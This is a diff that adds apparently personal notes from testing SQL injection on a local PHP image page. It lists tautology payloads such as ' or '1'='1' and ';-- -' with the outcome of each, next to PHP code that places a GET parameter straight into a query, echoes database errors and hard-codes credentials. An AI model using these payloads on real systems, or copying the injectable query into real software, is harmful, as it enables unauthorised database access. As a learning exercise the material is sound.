@@ -1,0 +1,106 @@
+id = ' or 1=1 ' >>>>>> NO image but error
+id = ' or '1'='1' ' >>>>>> image Default
+id = ' or '1'='1 ' >>>>>> NO image but error
+id = 3' or 1=1 ' >>>>>> No image but error
+id = 3' or '1'='1' ' >>>>>> image Default
+id = 3' or '1'='1 ' >>>>>> No image
+id = 9' or 1=1 ' >>>>>> No image but error
+id = 9' or '1'='1' ' >>>>>> image Default
+id = 9' or '1'='1 ' >>>>>> No image but error
+
+
+
+
+
+query("SELECT image_path, description FROM images where id='$id' ")
+<!-- Rejected -->
+id = ' or 1=1 ' >>>>>> NO image but error ... The query will be id='' or 1=1 '' there is additional ''
+id = ' or '1'='1 ' >>>>>> NO image but error ... The query will be id='' or 1=1 '' there is additional ''
+id = 3' or 1=1 ' >>>>>> No image but error
+id = 3' or '1'='1 ' >>>>>> No image but error
+id = 9' or 1=1 ' >>>>>> No image but error
+id = 9' or '1'='1 ' >>>>>> No image but error
+<!-- Rejected Double -->
+id = " or "1"="1" " >>>>>> No image
+id = 9" or "1"="1" " >>>>>> No image
+
+id = " or "1"="1" ";-- - >>>>>> No image
+id = 9' or 1=1 ';-- - >>>>>> No image but error
+id = 3' or 1=1 ';-- - >>>>>> No image but error
+id = 9" or "1"="1" ";-- - >>>>>> No image only
+id = " or 1=1;-- - >>>>>> No image only
+
+query("SELECT image_path, description FROM images where id='$id'")
+<!-- Accepted single -->
+id = ' or '1'='1' ' >>>>>> image Default
+id = 3' or '1'='1' ' >>>>>> image Default
+id = ' or 1=1;-- - >>>>>> image Default
+id = 9' or '1'='1' ' >>>>>> image Default
+
+<!-- Accepted comment -->
+id = ' or '1'='1 ';-- - >>>>>> image Default // Removing the the desc in sql
+id = 3' or '1'='1 ';-- - >>>>>> image Default // Removing the the desc in sql
+id = 9' or '1'='1 ';-- - >>>>>> image Default // Removing the the desc in sql
+<!-- Accepted Double -->
+id = 3" or "1"="1" " >>>>>> image
+
+
+$id = $_GET["id"];
+
+
+
+
+
+
+
+$result = $conn->query("SELECT image_path, description FROM images where id='$id'");
+// '' or 1=1 '
+if ($result->num_rows > 0) {
+$row = $result->fetch_assoc();
+$imagePath = $row['image_path'];
+$description = $row['description'];
+echo "<img src='" . $imagePath . "' alt='" . $description . "' class='rounded-circle mb-3' style='width: 150px;'
+    alt='Avatar'>";
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+$conn = new mysqli("localhost", "ahmed", "password", "mysql");
+$id = $_GET["id"];
+try {
+// if(!$result = $conn->query("SELECT image_path, description FROM images where name='$username' ORDER BY id DESC LIMIT
+1")){
+if(!$result = $conn->query("SELECT image_path, description FROM images where id='$id' ORDER BY id DESC LIMIT 1")){
+// '' or 1=1 '
+}
+} catch (\Throwable $th) {
+echo "<div>".$th->getMessage()."</div>";
+}
+if ($result->num_rows > 0) {
+
+$row = $result->fetch_assoc();
+$imagePath = $row['image_path'];
+$description = $row['description'];
+echo "<img src='" . $imagePath . "' alt='" . $description . "' class='rounded-circle mb-3' style='width: 150px;'
+    alt='Avatar'>";
+} else {
+$imagePath = "<img src='uploads/man-avatar.png' alt='default image' ' class=' rounded-circle mb-3' style='width: 150px;'
+    alt='Avatar'>" ;
